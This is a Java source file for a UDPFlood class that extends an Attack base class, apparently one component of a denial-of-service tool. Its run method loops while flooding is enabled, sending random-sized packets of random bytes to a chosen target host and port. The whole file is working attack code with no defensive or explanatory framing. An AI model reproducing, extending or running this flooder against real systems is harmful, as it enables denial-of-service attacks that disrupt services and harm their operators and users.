import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.util.Random;

public class UDPFlood extends Attack {

    private DatagramSocket socket;
    private DatagramPacket packet;
    private int size;
    private Random rand = new Random();
    private byte[] bytes;

    public UDPFlood(String target, int port) {
        super(target, port);
    }

    public void run() {
        while (Attack.isFlooding()) {
            try {
                size = rand.nextInt(1000);

                socket = new DatagramSocket();
                socket.connect(InetAddress.getByName(super.getTarget()), super.getPort());
                bytes = new byte[size];
                rand.nextBytes(bytes);
                packet = new DatagramPacket(bytes, bytes.length);
                socket.send(packet);
                socket.close();
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
    }

}